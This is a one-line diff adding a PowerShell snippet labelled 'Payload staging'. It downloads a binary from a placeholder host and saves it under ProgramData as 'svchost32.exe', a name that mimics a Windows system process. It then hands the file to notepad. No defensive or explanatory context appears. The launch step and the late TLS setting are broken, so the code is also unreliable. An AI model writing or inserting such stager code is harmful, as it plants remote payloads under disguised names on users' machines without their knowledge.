@@ -1,0 +1,1 @@
+<# Payload staging #> $RemoteUrl = "https://example.com/payload.bin"; $DropPath = 'C:\ProgramData\svchost32.exe'; (New-Object System.Net.WebClient).DownloadFile($RemoteUrl, $DropPath); Start-Process -FilePath "notepad.exe" -ArgumentList $DropPath; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
